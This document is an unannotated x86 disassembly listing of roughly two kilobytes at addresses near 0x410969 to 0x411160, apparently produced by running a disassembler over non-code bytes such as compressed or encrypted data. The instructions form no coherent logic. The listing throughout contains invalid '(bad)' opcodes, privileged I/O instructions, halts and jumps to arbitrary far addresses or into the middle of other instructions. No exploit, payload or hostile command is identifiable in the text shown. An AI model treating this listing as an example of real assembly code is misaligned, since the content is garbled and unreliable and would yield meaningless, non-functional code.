  410969:	mov    al,ds:0xe239742e
  41096e:	mov    edi,0x2e38edd8
  410973:	mov    bl,0xb7
  410975:	jne    0x410950
  410977:	sbb    BYTE PTR [edi+0x40b3c631],cl
  41097d:	out    dx,al
  41097e:	psubw  mm6,QWORD PTR [edi]
  410981:	mov    bl,0xc3
  410983:	or     dl,ch
  410985:	adc    al,0x49
  410987:	push   edi
  410988:	adc    BYTE PTR [esi-0x6ce6a2a6],dh
  41098e:	clc    
  41098f:	hlt    
  410990:	and    esp,esi
  410992:	pop    edx
  410993:	dec    ebx
  410994:	dec    edi
  410995:	call   0x2c3:0xe16915c5
  41099c:	xchg   ecx,eax
  41099e:	and    edx,eax
  4109a0:	mov    esp,0x9e8bb629
  4109a5:	cmp    DWORD PTR [ebp-0x1905b933],0x65
  4109ac:	pop    ss
  4109ad:	and    BYTE PTR [eax],cl
  4109af:	fmul   QWORD PTR [eax-0x2322d74a]
  4109b5:	pusha  
  4109b6:	sbb    al,0xcb
  4109b8:	xor    eax,esi
  4109ba:	pop    edi
  4109bb:	mov    cl,BYTE PTR [ebx-0x7d6730e0]
  4109c1:	rol    esi,0x5
  4109c4:	cli    
  4109c5:	fsub   QWORD PTR [esi]
  4109c7:	jb     0x41095f
  4109c9:	imul   edx,DWORD PTR [esi],0xffffffae
  4109cc:	fidivr WORD PTR [edi-0x6b]
  4109cf:	xchg   al,dl
  4109d1:	jnp    0x4109e7
  4109d3:	std    
  4109d4:	sbb    eax,0x77023df7
  4109d9:	data16 mov dh,0xf6
  4109dc:	out    dx,eax
  4109dd:	cmc    
  4109de:	add    ah,ah
  4109e0:	repz (bad) 
  4109e2:	aam    0x48
  4109e4:	imul   eax,DWORD PTR [ebx+0x7773ed2e],0x61b7e0e1
  4109ee:	or     esp,esp
  4109f0:	mov    al,ds:0x3db66d60
  4109f5:	xor    bl,BYTE PTR ds:0xdf9da679
  4109fb:	pop    ecx
  4109fc:	(bad)  
  4109fd:	loope  0x410a27
  4109ff:	mov    eax,ds:0xd5016424
  410a04:	sub    ch,BYTE PTR [esi+0x47]
  410a07:	(bad)  
  410a08:	sub    eax,0x1f8a4302
  410a0d:	or     eax,0xd95983ae
  410a12:	sub    BYTE PTR [esi+0x4e1f2aea],bl
  410a18:	rol    DWORD PTR [ecx+0x79cd3df9],1
  410a1e:	in     eax,0xf9
  410a20:	iret   
  410a21:	inc    ebx
  410a22:	hlt    
  410a23:	es xchg esp,eax
  410a25:	enter  0xc058,0x12
  410a29:	cmp    dh,BYTE PTR [edi+0x5]
  410a2c:	xchg   DWORD PTR [edx],eax
  410a2e:	fistp  WORD PTR [esi+0x36e70851]
  410a34:	fcmovb st,st(2)
  410a36:	repz cmp eax,0x12486658
  410a3c:	inc    esi
  410a3d:	scas   al,BYTE PTR es:[edi]
  410a3e:	icebp  
  410a3f:	jecxz  0x410a77
  410a41:	mov    cl,0x72
  410a43:	test   eax,0xec89c974
  410a48:	imul   eax,DWORD PTR [edi+0x50],0x9fd0210a
  410a4f:	jne    0x4109d8
  410a51:	(bad)  
  410a52:	mov    ch,0x1a
  410a54:	(bad)  
  410a56:	fiadd  DWORD PTR [ecx-0x6b9842c]
  410a5c:	jbe    0x410a48
  410a5e:	and    eax,ebp
  410a60:	jbe    0x410ab4
  410a62:	outs   dx,BYTE PTR ds:[esi]
  410a63:	int3   
  410a64:	in     eax,0x3b
  410a66:	sbb    edi,esp
  410a68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a69:	jne    0x410a23
  410a6b:	cs push esi
  410a6e:	xor    eax,0x1ea03d16
  410a73:	sub    BYTE PTR [esi],ah
  410a75:	fst    DWORD PTR [eax-0x3539b04a]
  410a7b:	in     eax,0x21
  410a7d:	mov    BYTE PTR [ebp+0x6889d1f3],bl
  410a83:	hlt    
  410a84:	loop   0x410a2a
  410a86:	cmp    BYTE PTR [ebx-0x3c1b5334],0xd2
  410a8d:	mov    WORD PTR [edx],es
  410a8f:	mov    DWORD PTR [ebx],ebp
  410a91:	cdq    
  410a92:	in     al,dx
  410a93:	pop    ecx
  410a94:	and    ebp,DWORD PTR [edi+0x63]
  410a97:	sub    DWORD PTR [edx+edi*8],esp
  410a9a:	mov    al,0x83
  410a9c:	pushf  
  410a9d:	add    eax,0xae299b45
  410aa2:	mov    ch,0xb4
  410aa4:	inc    edi
  410aa5:	aam    0x9a
  410aa7:	xchg   ebp,eax
  410aa8:	mov    esi,0x8a83f94e
  410aad:	jmp    0x52b83a9a
  410ab2:	cld    
  410ab3:	(bad)  
  410ab5:	dec    ebp
  410ab6:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  410ab8:	pop    edi
  410ab9:	leave  
  410aba:	ror    BYTE PTR [ebx-0xb],cl
  410abd:	add    DWORD PTR [eax],esi
  410abf:	sub    BYTE PTR [eax+0x7e],ah
  410ac2:	cmp    BYTE PTR [ebx+0x20db851c],0x3d
  410ac9:	scas   eax,DWORD PTR es:[edi]
  410aca:	rcl    bl,cl
  410acc:	inc    esi
  410acd:	int3   
  410ace:	mov    ecx,0x81020f43
  410ad3:	lods   al,BYTE PTR ds:[esi]
  410ad4:	adc    ah,dl
  410ad6:	xor    esp,esp
  410ad8:	fcomp  QWORD PTR [ebp-0x6a]
  410adb:	sbb    DWORD PTR [ecx],eax
  410add:	imul   esi,DWORD PTR [edi],0x768ba106
  410ae3:	inc    edi
  410ae4:	mov    BYTE PTR [eax],ah
  410ae6:	aam    0x36
  410ae8:	pop    esp
  410ae9:	ret    
  410aea:	(bad)
  410aed:	and    DWORD PTR [esi+0x59a4c016],esi
  410af3:	xchg   esi,eax
  410af4:	jne    0x410a80
  410af6:	in     al,0x43
  410af8:	mov    dh,0x3a
  410afa:	fdiv   DWORD PTR [ebx]
  410afc:	inc    edi
  410afd:	or     edx,DWORD PTR [ebx+0x2d]
  410b00:	xchg   BYTE PTR [ecx],cl
  410b02:	jbe    0x410ab9
  410b04:	jbe    0x410b6a
  410b06:	mov    ds:0x74fbc1bd,al
  410b0b:	push   eax
  410b0c:	cmp    DWORD PTR [esi+0x43ededc3],0xd3a9e98c
  410b16:	js     0x410ac9
  410b18:	fild   WORD PTR ds:0xa3932637
  410b1e:	mov    ecx,eax
  410b20:	sub    cl,BYTE PTR [edx+0x36b7c196]
  410b26:	leave  
  410b27:	scas   eax,DWORD PTR es:[edi]
  410b28:	mov    al,0xb1
  410b2a:	mov    ch,0xac
  410b2c:	cld    
  410b2d:	push   ecx
  410b2e:	and    ebx,ebp
  410b30:	cs adc eax,0x43297e9a
  410b36:	pop    ebp
  410b37:	rcr    DWORD PTR [ebp+eiz*4-0x8fda0fd],0xdc
  410b3f:	lods   al,BYTE PTR ds:[esi]
  410b40:	scas   eax,DWORD PTR es:[edi]
  410b41:	mov    ah,al
  410b43:	inc    edx
  410b44:	jb     0x410ada
  410b46:	xchg   esi,eax
  410b47:	aas    
  410b48:	mov    ds:0xe3db71fa,eax
  410b4d:	mov    edi,0xdc94c064
  410b52:	sub    BYTE PTR [edi],0x84
  410b55:	cdq    
  410b56:	adc    esp,DWORD PTR [ecx+ebp*1+0x3d]
  410b5a:	aad    0x3d
  410b5c:	adc    bh,0xa6
  410b5f:	or     al,0x7a
  410b61:	jl     0x410b60
  410b63:	fild   QWORD PTR [esi+eax*8-0x1d41f487]
  410b6a:	retf   0xa33
  410b6d:	push   0x5d
  410b6f:	(bad)  
  410b70:	adc    BYTE PTR [esi-0x48],ah
  410b73:	sar    BYTE PTR [edi],cl
  410b75:	leave  
  410b76:	xor    bh,BYTE PTR ds:0xdff6a55
  410b7c:	push   esp
  410b7d:	jne    0x410bf6
  410b7f:	cmp    esp,DWORD PTR [edi+0x416cb271]
  410b85:	jb     0x410be6
  410b87:	cs mov ebp,0x8d0e79c7
  410b8d:	adc    DWORD PTR [ebp-0x48dc100],0x6f6e386e
  410b97:	icebp  
  410b98:	lods   al,BYTE PTR ds:[esi]
  410b99:	jecxz  0x410b98
  410b9b:	xor    edx,DWORD PTR [edx+0x73]
  410b9e:	fldenv [eax+0x71]
  410ba1:	pop    edi
  410ba2:	hlt    
  410ba3:	pop    ss
  410ba4:	jle    0x410bb3
  410ba6:	rcr    BYTE PTR [ecx-0x7d3036a0],0xed
  410bad:	int    0x29
  410baf:	inc    edi
  410bb0:	fdivrp st(0),st
  410bb2:	inc    eax
  410bb3:	adc    BYTE PTR [esi+0x51],bh
  410bb6:	outs   dx,WORD PTR ds:[esi]
  410bb8:	adc    bl,BYTE PTR [ecx+0xccea8c]
  410bbe:	jnp    0x410b99
  410bc0:	aad    0xa7
  410bc2:	daa    
  410bc3:	stos   DWORD PTR es:[edi],eax
  410bc4:	je     0x410b56
  410bc6:	and    eax,0xfcb65656
  410bcb:	xchg   ebp,eax
  410bcc:	xchg   DWORD PTR [ebx-0x5958833b],ebx
  410bd2:	push   esp
  410bd3:	clc    
  410bd4:	hlt    
  410bd5:	rcr    DWORD PTR [ebp+0xe0d2d1d],cl
  410bdb:	or     esp,DWORD PTR [edi-0x39]
  410bde:	push   esp
  410bdf:	xor    esi,DWORD PTR [edi-0x2]
  410be2:	rcl    BYTE PTR ds:[ebx+0x24],0xde
  410be7:	add    bh,BYTE PTR [edx-0x4c]
  410bea:	(bad)  
  410bec:	(bad)  
  410bed:	outs   dx,DWORD PTR ds:[esi]
  410bee:	push   ebp
  410bef:	stos   BYTE PTR es:[edi],al
  410bf0:	push   esi
  410bf1:	and    al,0xbd
  410bf3:	outs   dx,BYTE PTR ds:[esi]
  410bf4:	jge    0x410c5e
  410bf6:	scas   eax,DWORD PTR es:[edi]
  410bf7:	cmp    BYTE PTR [edi-0x7cedcaa4],0xee
  410bfe:	jle    0x410c2f
  410c00:	je     0x410bc6
  410c02:	scas   eax,DWORD PTR es:[edi]
  410c03:	push   esi
  410c04:	dec    ebx
  410c05:	lea    ecx,[edi+ebx*1+0x1c]
  410c09:	dec    eax
  410c0a:	into   
  410c0b:	mov    edx,0x55b3abf1
  410c10:	repnz (bad) 
  410c12:	out    0x66,al
  410c14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c15:	mov    WORD PTR [edx-0x42],gs
  410c18:	retf   0x3523
  410c1b:	hlt    
  410c1c:	jge    0x410bd1
  410c1e:	test   BYTE PTR [eax],al
  410c20:	and    al,0x19
  410c22:	cwde   
  410c23:	aad    0xe4
  410c25:	inc    esi
  410c26:	cld    
  410c27:	inc    ecx
  410c28:	icebp  
  410c29:	iret   
  410c2a:	mov    eax,ds:0xc85f973a
  410c2f:	mov    esi,0xadf8e88d
  410c34:	add    eax,DWORD PTR [edx]
  410c36:	xor    cl,0x2d
  410c39:	mov    edi,0x66a7e66c
  410c3e:	jbe    0x410caa
  410c40:	lods   eax,DWORD PTR ds:[esi]
  410c41:	(bad)  
  410c42:	ss jne 0x410c77
  410c45:	dec    ecx
  410c46:	dec    ebx
  410c47:	ins    BYTE PTR es:[edi],dx
  410c48:	sti    
  410c49:	sub    ebx,DWORD PTR [ebx+0x42]
  410c4c:	jae    0x410c61
  410c4e:	popa   
  410c4f:	mov    WORD PTR [eax+0x20],fs
  410c52:	push   cs
  410c53:	mov    esi,0x1e0ef446
  410c58:	mov    ds:0xdfae9bc2,eax
  410c5d:	sub    esp,DWORD PTR [edi+0x34]
  410c60:	out    dx,al
  410c61:	xchg   esi,eax
  410c62:	push   ebp
  410c63:	adc    al,0xb1
  410c65:	sbb    eax,0xb297433a
  410c6a:	in     al,0xb9
  410c6c:	xlat   BYTE PTR ds:[ebx]
  410c6d:	je     0x410cda
  410c6f:	and    eax,0xf43b3efe
  410c74:	push   ecx
  410c75:	push   0xb0a4732a
  410c7a:	test   BYTE PTR gs:[esi],cl
  410c7d:	mov    edi,0x39826438
  410c82:	mov    bl,0xda
  410c84:	xchg   ebx,eax
  410c85:	add    al,0x4d
  410c87:	push   eax
  410c88:	rol    DWORD PTR [esi],0x13
  410c8b:	push   es
  410c8c:	test   BYTE PTR [ebx-0x258a8725],ah
  410c92:	mov    edi,0xe362899
  410c97:	mov    ebp,0xcd95040b
  410c9c:	xor    al,0xb
  410c9e:	xor    al,0x43
  410ca0:	retf   
  410ca1:	mov    ebp,ecx
  410ca3:	ds inc edx
  410ca5:	pop    ecx
  410ca6:	and    edi,ebp
  410ca8:	mov    al,0x9a
  410caa:	(bad)  
  410cab:	lds    edi,FWORD PTR [ebp-0x18]
  410cae:	dec    edx
  410caf:	cmp    dh,dl
  410cb1:	xor    BYTE PTR [ebp+ebx*1-0x1c],ah
  410cb5:	mov    eax,ds:0x4ca17a76
  410cba:	sub    eax,0x9a2f46da
  410cbf:	and    eax,DWORD PTR [edi+ecx*2]
  410cc2:	sub    ebp,ebp
  410cc4:	pop    esi
  410cc5:	jae    0x410ca1
  410cc7:	push   0xfffffffb
  410cc9:	pop    esp
  410cca:	pop    esi
  410ccb:	icebp  
  410ccc:	repz mov al,ds:0x25f8ba0d
  410cd2:	add    al,0xee
  410cd4:	mov    ch,0xa5
  410cd6:	enter  0x71a0,0x5
  410cda:	add    esi,eax
  410cdc:	adc    DWORD PTR [edi],ecx
  410cde:	push   es
  410cdf:	push   0x4c
  410ce1:	pop    ss
  410ce2:	dec    ebp
  410ce3:	not    edx
  410ce5:	lds    esp,FWORD PTR [edx-0x63b04425]
  410ceb:	sub    bl,BYTE PTR [ecx+eiz*8]
  410cee:	popf   
  410cef:	xor    eax,0xad297d81
  410cf4:	xchg   BYTE PTR [eax-0x1b3c727d],al
  410cfa:	mov    ds:0xba32e598,al
  410cff:	mov    esp,0xea06944a
  410d04:	inc    ebp
  410d05:	dec    edx
  410d06:	jp     0x410d50
  410d08:	imul   dh
  410d0a:	fimul  WORD PTR [ebp+0x8]
  410d0d:	or     DWORD PTR [esi],edx
  410d0f:	push   esi
  410d10:	test   ecx,eax
  410d12:	into   
  410d13:	jl     0x410cc8
  410d15:	add    BYTE PTR [edx+0x2cbffc76],ah
  410d1b:	xchg   edx,eax
  410d1c:	mov    al,0x48
  410d1e:	sub    BYTE PTR [eax-0x6c],ch
  410d21:	cli    
  410d22:	mov    fs,WORD PTR [edx-0x40]
  410d25:	repz xchg edx,eax
  410d27:	sahf   
  410d28:	add    BYTE PTR [ebx],bl
  410d2a:	clc    
  410d2b:	jmp    0xe7b37ab
  410d30:	sub    al,0x3b
  410d32:	pop    esi
  410d33:	arpl   WORD PTR [ebx],dx
  410d35:	inc    esi
  410d36:	int3   
  410d37:	and    DWORD PTR [bx+si],esi
  410d3a:	div    BYTE PTR [ecx]
  410d3c:	daa    
  410d3d:	jno    0x410d84
  410d3f:	cmp    DWORD PTR [ecx+edx*4-0x36],0x34ca921d
  410d47:	sar    BYTE PTR [ebp+0x1b],0x16
  410d4b:	or     dl,BYTE PTR [eax]
  410d4d:	mov    ebx,0xa061955a
  410d52:	(bad)  
  410d53:	repnz xor al,0xac
  410d56:	push   ss
  410d57:	int    0x26
  410d59:	mov    esi,0xeb22ac39
  410d5e:	data16 aam 0x4
  410d61:	xchg   ecx,eax
  410d62:	mov    esp,eax
  410d64:	pop    eax
  410d65:	into   
  410d66:	xor    eax,0xbb6e61fb
  410d6b:	aam    0x49
  410d6d:	ret    0x9455
  410d70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d72:	fidivr DWORD PTR [ebx+ebp*4+0x3e0497b8]
  410d79:	xchg   DWORD PTR [ebp+0x2b840f34],edx
  410d7f:	push   edx
  410d80:	into   
  410d81:	and    DWORD PTR [ebx],0x1c
  410d84:	mov    edi,0xb27a490
  410d89:	out    dx,eax
  410d8a:	outs   dx,BYTE PTR ds:[esi]
  410d8b:	mov    cs,ebp
  410d8d:	add    BYTE PTR [ebx+0x1816cada],bl
  410d93:	shl    BYTE PTR [esi+0x6b08df7f],1
  410d99:	ins    BYTE PTR es:[edi],dx
  410d9a:	repnz cmp DWORD PTR [eax*4+0x7323e249],edx
  410da2:	scas   al,BYTE PTR es:[edi]
  410da3:	ins    DWORD PTR es:[edi],dx
  410da4:	mov    ecx,0x25185e69
  410da9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410daa:	fnsave ds:0xb5bf005c
  410db0:	push   ss
  410db1:	jae    0x410dab
  410db3:	mov    ebp,0xaa631cb3
  410db8:	repz dec edi
  410dba:	inc    edi
  410dbb:	ins    BYTE PTR es:[edi],dx
  410dbc:	push   edi
  410dbd:	lds    ecx,FWORD PTR [eax+0x3c7c5ba1]
  410dc3:	add    dl,BYTE PTR [edx]
  410dc5:	mov    ch,BYTE PTR ds:0x23928239
  410dcb:	fwait
  410dcc:	lods   eax,DWORD PTR ds:[esi]
  410dcd:	xor    ebp,esi
  410dcf:	fstp   DWORD PTR [edx+eax*8+0x17]
  410dd3:	xchg   DWORD PTR [ebx+0x3d],edi
  410dd6:	ja     0x410d83
  410dd8:	ret    
  410dd9:	icebp  
  410dda:	add    ah,bl
  410ddc:	fdiv   DWORD PTR [eax-0x298787a4]
  410de2:	les    edi,FWORD PTR [eax-0x12]
  410de5:	mov    eax,0xcc33d694
  410dea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410deb:	bound  esi,QWORD PTR es:[ecx-0x4278bf51]
  410df2:	or     BYTE PTR [edx-0x27],bl
  410df5:	retf   0x7925
  410df8:	aas    
  410df9:	inc    ebx
  410dfa:	push   es
  410dfb:	push   ebp
  410dfc:	ret    0x5c00
  410dff:	in     eax,dx
  410e00:	aas    
  410e01:	push   0x38a219b
  410e06:	js     0x410dda
  410e08:	dec    ebp
  410e09:	mov    ss,WORD PTR [eax+edi*2+0x5ea55ae2]
  410e10:	xor    BYTE PTR ds:0x6291d2cb,0x4c
  410e17:	(bad)  
  410e18:	std    
  410e19:	ret    
  410e1a:	es retf 
  410e1c:	add    ebx,edi
  410e1e:	int    0x7d
  410e20:	add    DWORD PTR [eax-0x4a],edx
  410e23:	ss jno 0x410df2
  410e26:	add    al,0x6d
  410e28:	test   eax,0xb091ecc2
  410e2d:	es cwde 
  410e2f:	mov    WORD PTR [ecx],es
  410e31:	sbb    al,0x37
  410e33:	fcomp  QWORD PTR [esi]
  410e35:	js     0x410e47
  410e37:	or     ch,ah
  410e39:	mov    ds:0x2fcd4f9c,eax
  410e3e:	or     BYTE PTR [eax-0x5c7de6d3],bl
  410e44:	mov    bl,0xfc
  410e46:	sbb    edx,DWORD PTR [ebp+0x205c2ee4]
  410e4c:	in     al,0x6e
  410e4e:	inc    ecx
  410e4f:	not    DWORD PTR [eax+eiz*1-0x70e37a8]
  410e56:	loopne 0x410e8b
  410e58:	and    BYTE PTR [esi+eiz*2+0x66],ch
  410e5c:	mov    esi,0xa41fe9ca
  410e61:	mov    ds:0x646f0c45,eax
  410e66:	jns    0x410e5b
  410e68:	xchg   eax,ebp
  410e6a:	ret    
  410e6b:	loopne 0x410ee4
  410e6d:	or     DWORD PTR ds:[esi-0x3b],esp
  410e71:	push   ecx
  410e72:	sub    DWORD PTR [edx+0xdcf0dc9],ebp
  410e78:	fucomi st,st(6)
  410e7a:	test   dh,0x4f
  410e7d:	iret   
  410e7e:	xchg   DWORD PTR [edi],eax
  410e80:	xchg   esp,eax
  410e81:	mov    edx,0x6dd423d0
  410e86:	call   0xcf74f3a4
  410e8b:	pop    esi
  410e8c:	scas   al,BYTE PTR es:[edi]
  410e8d:	cmp    esp,DWORD PTR es:[ecx+0x50]
  410e91:	(bad)  
  410e92:	jae    0x38927135
  410e98:	pushf  
  410e99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e9a:	sbb    al,0xf
  410e9c:	add    eax,0x2d0949fb
  410ea1:	pop    esp
  410ea2:	ret    0x42d9
  410ea5:	mov    esi,0x9aa144d8
  410eaa:	inc    ecx
  410eab:	ret    0xb04a
  410eae:	adc    DWORD PTR [eax+0x7b98c760],esp
  410eb4:	stos   BYTE PTR es:[edi],al
  410eb5:	(bad)  
  410eb6:	adc    BYTE PTR ds:0x2c76e951,ch
  410ebc:	clc    
  410ebd:	jo     0x410e77
  410ebf:	adc    dh,BYTE PTR [esi]
  410ec1:	in     al,0xcd
  410ec3:	mov    dl,0x26
  410ec5:	sbb    ebx,DWORD PTR [ecx+0x11]
  410ec8:	(bad)  
  410ec9:	int    0x26
  410ecb:	ds fwait
  410ecd:	inc    edx
  410ece:	and    ax,0x2bf9
  410ed2:	mov    ebp,0x75ccf179
  410ed7:	gs lock sbb ah,BYTE PTR fs:[ebp+0x5b]
  410edd:	fucomi st,st(4)
  410edf:	icebp  
  410ee0:	adc    cl,BYTE PTR [esi]
  410ee2:	and    esi,DWORD PTR ds:0xdbc0bf27
  410ee8:	mov    ebx,0x411a900b
  410eed:	dec    DWORD PTR [ecx+0x63]
  410ef0:	je     0x410eb1
  410ef2:	add    BYTE PTR [edi],0x82
  410ef5:	not    DWORD PTR [ecx-0x3d]
  410ef8:	(bad)  
  410ef9:	into   
  410efa:	xchg   esp,eax
  410efb:	or     ebx,DWORD PTR [esp+edi*2]
  410efe:	fs inc eax
  410f00:	and    al,0x2e
  410f02:	in     eax,0x1b
  410f04:	add    bl,bh
  410f06:	mov    esp,0x7f046612
  410f0b:	sbb    edx,0xe2b68746
  410f11:	cdq    
  410f12:	cmp    BYTE PTR [eax-0x7f],ch
  410f15:	mov    esi,0xccde6c94
  410f1a:	clc    
  410f1b:	pop    ebx
  410f1c:	add    esi,DWORD PTR [edi+edx*4-0xddeb221]
  410f23:	push   ebp
  410f24:	push   ds
  410f25:	in     eax,dx
  410f26:	int3   
  410f27:	repnz scas al,BYTE PTR es:[edi]
  410f29:	es pop ebp
  410f2b:	mov    ds:0xcd2ca61e,al
  410f30:	cwde   
  410f31:	add    eax,0x4d2ccb87
  410f36:	jle    0x410fa6
  410f38:	jmp    0x410fb0
  410f3a:	jmp    0x410f4b
  410f3c:	mov    al,ds:0x8912d8c0
  410f41:	or     dh,BYTE PTR [esp+ecx*8-0x67]
  410f45:	xchg   edx,eax
  410f46:	xchg   ecx,eax
  410f47:	repz shl bl,1
  410f4a:	dec    edi
  410f4b:	je     0x410f55
  410f4d:	cdq    
  410f4e:	call   0xebf0:0x9211cd78
  410f55:	pop    eax
  410f56:	jne    0x410f05
  410f58:	setae  BYTE PTR [esi+ecx*8]
  410f5c:	iret   
  410f5d:	aad    0x2a
  410f5f:	mov    esi,0x3f8de60b
  410f64:	add    al,0xcf
  410f66:	retf   0xc02a
  410f69:	cwde   
  410f6a:	pop    ebx
  410f6b:	(bad)  
  410f6c:	sbb    al,0x0
  410f6e:	loop   0x410f43
  410f70:	hlt    
  410f71:	in     al,0xd3
  410f73:	out    dx,al
  410f74:	jae    0x410ff5
  410f76:	and    eax,0x61e00e62
  410f7b:	mov    ah,0xd3
  410f7d:	sub    edx,DWORD PTR [eax+ebp*8]
  410f80:	fadd   QWORD PTR [edx-0x6744172e]
  410f86:	sub    BYTE PTR [esi-0x3d],bl
  410f89:	inc    esp
  410f8a:	test   DWORD PTR [edx+0x30],ebp
  410f8d:	push   0xe36fd2bc
  410f92:	pop    ebp
  410f93:	or     ebp,esp
  410f95:	jmp    0x6266acdf
  410f9a:	xchg   edx,eax
  410f9b:	pop    ecx
  410f9c:	and    DWORD PTR [ebx-0x5c3f025d],ebx
  410fa2:	ja     0x411000
  410fa4:	dec    eax
  410fa5:	ins    DWORD PTR es:[edi],dx
  410fa6:	aas    
  410fa7:	and    BYTE PTR [edi-0x57734064],bl
  410fad:	xchg   edi,eax
  410fae:	inc    ecx
  410faf:	int3   
  410fb0:	ret    0x989a
  410fb3:	out    0xf8,eax
  410fb5:	dec    esi
  410fb6:	jb     0x410fd7
  410fb8:	(bad)  
  410fb9:	mov    ?,WORD PTR [ecx-0x65a8da41]
  410fbf:	sbb    ecx,ecx
  410fc1:	pop    ds
  410fc2:	pusha  
  410fc3:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  410fc5:	dec    ebx
  410fc6:	popa   
  410fc7:	ficomp WORD PTR [ebx+0x1b8f7869]
  410fcd:	dec    eax
  410fce:	shr    DWORD PTR [ebx-0x59],1
  410fd1:	xchg   edi,eax
  410fd2:	mov    bh,0x28
  410fd4:	daa    
  410fd5:	xchg   ecx,eax
  410fd6:	jnp    0x410fd6
  410fd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fd9:	inc    ebx
  410fda:	jle    0x410f95
  410fdc:	das    
  410fdd:	and    DWORD PTR fs:[ebx+0x1954836d],0x9fe5f66e
  410fe8:	cmp    ebp,DWORD PTR [edi-0x2d4e48f1]
  410fee:	xchg   esp,eax
  410fef:	pop    ecx
  410ff0:	(bad)  
  410ff1:	dec    edx
  410ff2:	jbe    0x410fc5
  410ff4:	pop    edx
  410ff5:	int    0x4f
  410ff7:	mov    dl,bh
  410ff9:	idiv   BYTE PTR [bp-0x28c6]
  410ffe:	adc    esp,edx
  411000:	mov    ecx,0x2de1f642
  411005:	sub    ch,BYTE PTR [ebp-0x1c]
  411008:	leave  
  411009:	jp     0x411022
  41100b:	or     DWORD PTR ds:0x28ed762,esp
  411011:	fwait
  411012:	mov    cl,BYTE PTR [ebp+0x27]
  411015:	adc    bl,BYTE PTR [eax]
  411017:	mov    ch,0x1
  411019:	fld    DWORD PTR [ebp-0x42]
  41101c:	call   0x7ea9:0xd6b65000
  411023:	lds    edi,FWORD PTR [edi-0x1793f9cf]
  411029:	setp   cl
  41102c:	or     ebx,esi
  41102e:	add    ch,al
  411030:	mov    ss,WORD PTR [eax-0x58]
  411033:	sub    eax,0x4ecc0a20
  411038:	xor    DWORD PTR [ebx+0x44ceaa79],edx
  41103e:	mov    eax,0x53adef72
  411043:	daa    
  411044:	lock pop eax
  411046:	ja     0x410fea
  411048:	retf   
  411049:	js     0x411045
  41104b:	and    ch,0x12
  41104e:	mov    ds:0x5bee5b06,al
  411053:	dec    esi
  411054:	mov    ds:0x7fd22417,al
  411059:	cmp    al,0xea
  41105b:	and    eax,0x81961c6a
  411060:	and    dh,BYTE PTR [ecx]
  411062:	stc    
  411063:	push   ebp
  411064:	inc    eax
  411065:	adc    eax,0xd42c65d1
  41106a:	leave  
  41106b:	or     eax,DWORD PTR [eax]
  41106d:	and    ch,BYTE PTR [ebp+edi*1-0x43]
  411071:	mov    dh,0xb8
  411073:	imul   esp,DWORD PTR [ebx],0xffffffd8
  411076:	loopne 0x4110dc
  411078:	bound  ebp,QWORD PTR [ebp-0x3dae4853]
  41107e:	gs mov edi,0x73064b83
  411084:	push   0x51160bc6
  411089:	jmp    0x9ea3:0x10c54f0d
  411090:	jbe    0x411102
  411092:	shl    DWORD PTR [ebx+ebx*1-0xf560240],cl
  411099:	out    dx,eax
  41109a:	push   ebx
  41109b:	out    dx,eax
  41109c:	xor    al,0x56
  41109e:	cmp    eax,ebp
  4110a0:	mov    edi,DWORD PTR [edi+0x3a545225]
  4110a6:	dec    esp
  4110a7:	and    eax,0xb3e5f419
  4110ac:	push   ds
  4110ad:	mov    DWORD PTR [edx+0x3eede87f],esi
  4110b3:	outs   dx,DWORD PTR ds:[esi]
  4110b4:	dec    esi
  4110b5:	mov    BYTE PTR [ecx+esi*4],0x5
  4110b9:	arpl   WORD PTR [edx-0x62fef0f],bx
  4110bf:	retf   0x41a8
  4110c2:	xor    eax,0xcd91a49e
  4110c7:	pop    edi
  4110c8:	push   esp
  4110c9:	pop    ebx
  4110ca:	mov    ds:0x67f8e080,eax
  4110cf:	outs   dx,DWORD PTR ds:[esi]
  4110d0:	(bad)  
  4110d1:	jg     0x411122
  4110d3:	jno    0x4110f8
  4110d5:	and    eax,ebx
  4110d7:	push   ebx
  4110d8:	push   esi
  4110d9:	pop    ss
  4110da:	fistp  DWORD PTR [eax-0xa]
  4110dd:	clc    
  4110de:	cmp    BYTE PTR [eax],dl
  4110e0:	outs   dx,DWORD PTR ds:[esi]
  4110e1:	out    0x21,al
  4110e3:	out    0x51,eax
  4110e5:	(bad)  
  4110e6:	fmul   st(3),st
  4110e8:	cld    
  4110e9:	fisttp QWORD PTR ds:0xfb4cf368
  4110ef:	push   ebp
  4110f0:	dec    esi
  4110f1:	push   ebp
  4110f2:	push   eax
  4110f3:	jl     0x4110da
  4110f5:	dec    edi
  4110f6:	cmp    BYTE PTR [ebx-0x5fe1c5e],ah
  4110fc:	push   esp
  4110fd:	adc    dh,BYTE PTR [ecx+0x13]
  411100:	jbe    0x41116c
  411102:	cld    
  411103:	bound  edi,QWORD PTR [ebx+edi*1-0x44f4fa1e]
  41110a:	inc    ebp
  41110b:	(bad)  
  41110d:	adc    eax,DWORD PTR [ebx+0x29]
  411110:	jle    0x411169
  411112:	leave  
  411113:	rcl    ebx,0xde
  411116:	ret    0xb152
  411119:	mov    al,BYTE PTR [eax]
  41111b:	mov    ebx,0x89a5459d
  411120:	jno    0x4110f1
  411122:	pusha  
  411123:	aaa    
  411124:	add    BYTE PTR [eax-0x77aaf7d1],al
  41112a:	inc    ecx
  41112b:	pop    es
  41112c:	and    esi,DWORD PTR [si-0x68cf]
  411131:	and    ch,BYTE PTR [edx+0x6049a3d1]
  411137:	fwait
  411138:	hlt    
  411139:	stos   DWORD PTR es:[edi],eax
  41113a:	dec    ebp
  41113b:	mov    edi,0xf404212b
  411140:	test   eax,0x56322a15
  411145:	add    eax,0xa6db1097
  41114a:	ja     0x4110d9
  41114c:	jnp    0x411180
  41114e:	mov    edx,0x5cd20aaa
  411153:	es mov ah,0x6d
  411156:	(bad)  
  411157:	pop    eax
  411158:	js     0x411151
  41115a:	cwde   
  41115b:	push   edi
  41115c:	mov    ch,0x93
  41115e:	test   BYTE PTR [ecx],dh
  411160:	mov    ecx,0xc2ba134f
